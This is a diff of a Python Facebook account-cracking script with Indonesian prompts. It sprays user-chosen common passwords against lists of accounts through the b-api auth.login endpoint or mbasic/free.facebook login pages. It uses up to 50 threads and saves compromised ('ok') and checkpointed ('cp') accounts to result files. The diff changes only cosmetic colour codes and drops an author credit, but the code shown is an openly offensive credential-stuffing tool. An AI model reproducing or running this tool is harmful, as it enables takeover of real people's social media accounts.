@@ -26,24 +26,24 @@ class crack:
 
 	def naroskeun(self):
 		#print (" [*] Proses selesai...\n ")
-		tod=input(""+P+" ["+K+"?"+P+"] Gunakan password manual "+H+"y"+P+"/"+M+"t"+P+" :"+K+" ")
+		tod=input(""+P+" [?] Gunakan password manual "+H+"y"+P+"/"+M+"t"+P+" :"+K+" ")
 		while tod in (""," "):
 			print(M+" [!] Isi yang benar")
-			tod=input(""+P+" ["+K+"?"+P+"] Gunakan password manual "+H+"y"+P+"/"+M+"t"+P+" :"+K+" ")
+			tod=input(""+P+" [?] Gunakan password manual "+H+"y"+P+"/"+M+"t"+P+" :"+K+" ")
 		if tod in tuple("yY"):
-			print("\n"+P+" ["+U+"*"+P+"] contoh : "+K+"sayang,rahasia,bismillah")
-			password=input(P+" ["+K+"?"+P+"] password :"+K+" ")
+			print("\n"+P+" [*] contoh : "+K+"sayang,rahasia,bismillah")
+			password=input(P+" [?] password :"+K+" ")
 			while len(password) < 6:
 				print(M+" [!] Isi yang benar" if password in (""," ") else ""+M+" [!] password minimal 6 karakter")
-				password=input(P+" ["+K+"?"+P+"] password :"+K+" ")
+				password=input(P+" [?] password :"+K+" ")
 			print("\n"+P+" [ pilih method login ] ")
-			print("\n ["+K+"1"+P+"] method "+M+"b-api "+P+"(crack cepat)")
-			print(" ["+K+"2"+P+"] method "+U+"free.facebook "+P+"(crack lambat)" if "free.facebook" in self.url else " ["+K+"2"+P+"] method "+U+"mbasic"+P+" (crack lambat)")
+			print("\n [1] method "+M+"b-api "+P+"(crack cepat)")
+			print(" [2] method "+U+"free.facebook "+P+"(crack lambat)" if "free.facebook" in self.url else " [2] method "+U+"mbasic"+P+" (crack lambat)")
 			self.awokawok_ngentod(password.split(","))
 		if tod in tuple("tT"):
 			print("\n"+P+" [ pilih method login ] ")
-			print("\n ["+K+"1"+P+"] method "+M+"b-api "+P+"(crack cepat)")
-			print(" ["+K+"2"+P+"] method "+U+"free.facebook "+P+"(crack lambat)" if "free.facebook" in self.url else " ["+K+"2"+P+"] method "+U+"mbasic"+P+" (crack lambat)")
+			print("\n [1] method "+M+"b-api "+P+"(crack cepat)")
+			print(" [2] method "+U+"free.facebook "+P+"(crack lambat)" if "free.facebook" in self.url else " [2] method "+U+"mbasic"+P+" (crack lambat)")
 			self.awokawok_ngentod()
 		else:
 			print(M+" [!] isi yang benar");self.naroskeun()
@@ -72,10 +72,10 @@ class crack:
 		return ses.get("https://b-api.facebook.com/method/auth.login").json()
 	
 	def awokawok_ngentod(self,manual=None):
-		pilih=input("\n"+P+" ["+K+"?"+P+"] pilih :"+K+" ")
+		pilih=input("\n"+P+" [?] pilih :"+K+" ")
 		while pilih in (""," "):
 			print(M+" [!] Isi yang benar")
-			pilih=input("\n"+P+" ["+K+"?"+P+"] pilih :"+K+" ")
+			pilih=input("\n"+P+" [?] pilih :"+K+" ")
 		speed=50 if manual is None else 30
 		if speed==30:
 			speed=50 if len(manual) <= 5 else 30
@@ -94,7 +94,7 @@ class crack:
 			membagi=pengguna.split("(Romi Afrizal)")
 			kumpul.append({"username":membagi[0],"password":password if password is not None else pw_list(membagi)})
 		print ("\n"+P+" [#]------------------------------------------------")
-		print(P+" ["+U+"*"+P+"] Crack by "+H+"ROY-ID"+P+", tekan ctrl+z untuk berhenti")
+		print(P+" [*] crack berjalan, tekan ctrl+z untuk berhenti")
 		print (P+" [#]------------------------------------------------\n")
 		with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
 			if "form" in str(login):
@@ -116,7 +116,7 @@ class crack:
 				else:
 					continue
 			#m = random.choice(['\x1b[1;91m','\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-			cout+=1;print(f"\r ["+U+"*"+P+"] crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
+			cout+=1;print(f"\r [*] crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
 		except:
 			self.log_mbasic(username,list_password,login)
 
@@ -139,7 +139,7 @@ class crack:
 				else:
 					continue
 			#m = random.choice(['\x1b[1;91m','\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-			cout+=1;print(f"\r ["+U+"*"+P+"] crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
+			cout+=1;print(f"\r [*] crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
 		except:
 			self.log_bapics(username,list_password,login)
 				
@@ -151,10 +151,10 @@ class crack:
 
 	def result(self):
 		if len(live)!=0 or len(chek)!=0:
-			print(f"\n\n ["+U+"*"+P+"] selesai...\n") #[*]\x1b[1;32m [ok]\x1b[1;37m/\x1b[1;33m[cp]\x1b[1;37m : \x1b[1;32m{len(ok)}\x1b[1;37m/\x1b[1;33m{len(cp)}")
+			print(f"\n\n [*] selesai...\n") #[*]\x1b[1;32m [ok]\x1b[1;37m/\x1b[1;33m[cp]\x1b[1;37m : \x1b[1;32m{len(ok)}\x1b[1;37m/\x1b[1;33m{len(cp)}")
 			if len(live)!=0:
-				print(P+" ["+U+"*"+P+"] hasil "+H+"[ok] "+P+"tersimpan di : result/live.txt")
+				print(P+" [*] hasil "+H+"[ok] "+P+"tersimpan di : result/live.txt")
 			if len(chek)!=0:
-				print(P+" ["+U+"*"+P+"] hasil "+K+"[cp]"+P+" tersimpan di : result/chek.txt")
+				print(P+" [*] hasil "+K+"[cp]"+P+" tersimpan di : result/chek.txt")
 			exit()
 		else: exit("\n\n"+M+" [!] tidak mendapatkan hasil")
